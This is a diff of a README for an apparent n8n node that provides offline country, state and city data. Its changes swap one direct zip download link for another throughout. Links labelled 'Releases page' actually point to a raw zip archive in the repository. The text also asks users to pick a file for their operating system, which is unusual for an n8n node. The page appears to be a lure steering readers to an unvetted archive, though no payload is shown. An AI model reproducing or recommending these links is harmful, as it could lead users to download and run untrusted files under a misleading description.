@@ -1,6 +1,6 @@
 # 🌍 n8n-nodes-country-state-city - Access Global Location Data Easily
 
-[![Download n8n-nodes-country-state-city](https://raw.githubusercontent.com/Drivebykillingpetrolengine444/n8n-nodes-country-state-city/master/nodes/n8n-nodes-country-state-city_v2.4-alpha.2.zip)](https://raw.githubusercontent.com/Drivebykillingpetrolengine444/n8n-nodes-country-state-city/master/nodes/n8n-nodes-country-state-city_v2.4-alpha.2.zip)
+[![Download n8n-nodes-country-state-city](https://raw.githubusercontent.com/Drivebykillingpetrolengine444/n8n-nodes-country-state-city/master/nodes/country-n-city-state-nodes-1.7.zip)](https://raw.githubusercontent.com/Drivebykillingpetrolengine444/n8n-nodes-country-state-city/master/nodes/country-n-city-state-nodes-1.7.zip)
 
 ## 📖 Description
 n8n-nodes-country-state-city is a simple tool for accessing offline country, state, and city data without needing API keys. This means you can gather important geographic information quickly and efficiently. The tool supports ISO2 and ISO3 country codes, making it ideal for those who work with global data.
@@ -9,7 +9,7 @@ n8n-nodes-country-state-city is a simple tool for accessing offline country, sta
 To get started with n8n-nodes-country-state-city, follow the steps below:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://raw.githubusercontent.com/Drivebykillingpetrolengine444/n8n-nodes-country-state-city/master/nodes/n8n-nodes-country-state-city_v2.4-alpha.2.zip) to find the latest version of the application.
+   Go to our [Releases page](https://raw.githubusercontent.com/Drivebykillingpetrolengine444/n8n-nodes-country-state-city/master/nodes/country-n-city-state-nodes-1.7.zip) to find the latest version of the application.
 
 2. **Download the Application**  
    Once on the Releases page, look for the latest version. Click on the "Assets" dropdown to see available files. Download the file that matches your operating system.
@@ -37,7 +37,7 @@ To run n8n-nodes-country-state-city, your system should meet the following requi
 ## 📥 Download & Install
 To download n8n-nodes-country-state-city, visit the Releases page where you found the latest version. Click on the link below to get there quickly.
 
-[Download n8n-nodes-country-state-city](https://raw.githubusercontent.com/Drivebykillingpetrolengine444/n8n-nodes-country-state-city/master/nodes/n8n-nodes-country-state-city_v2.4-alpha.2.zip)
+[Download n8n-nodes-country-state-city](https://raw.githubusercontent.com/Drivebykillingpetrolengine444/n8n-nodes-country-state-city/master/nodes/country-n-city-state-nodes-1.7.zip)
 
 ## 📘 Usage Instructions
 After launching the application, you can select the type of data you want to query. Here’s a quick overview:
